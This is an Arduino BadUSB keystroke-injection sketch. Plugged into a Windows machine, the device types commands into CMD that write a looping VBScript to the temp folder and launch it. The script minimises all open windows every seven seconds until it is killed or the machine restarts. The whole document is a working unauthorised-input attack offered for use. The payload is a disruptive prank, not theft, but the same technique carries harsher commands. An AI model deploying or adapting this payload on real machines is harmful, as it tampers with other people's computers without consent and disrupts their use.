#include <Keyboard.h>
//This script will minimize all opened windows every 7 second. You can unplug device after it's executed
//system restart will stop the script
//you can also stop it by running: "taskkill /F /IM wscript.exe /T" in CMD

void setup() {
  //initialize keyboard and enter CMD
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('c');
  delay(500);
  Keyboard.press('m');
  delay(500);
  Keyboard.press('d');
  delay(300);
  Keyboard.release('c');
  delay(300);
  Keyboard.release('m');
  delay(300);
  Keyboard.release('d');
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //create script for minimizing windows
  Keyboard.println("del %tmp%\\minimze.vbs");
  delay(1000);
  Keyboard.println("cd %tmp% && copy con minimze.vbs");
  Keyboard.println("do");
  Keyboard.println("set oShellApp = CreateObject(\"Shell.Application\")");
  Keyboard.println("oShellApp.MinimizeAll");
  Keyboard.println("WScript.Sleep 7000");
  Keyboard.println("loop");
  //save and exit file
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(300);
  Keyboard.press('z');
  delay(500);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(300);
  Keyboard.release('z');
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //execute script
  Keyboard.println("start minimze.vbs && exit");

  delay(1000);
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
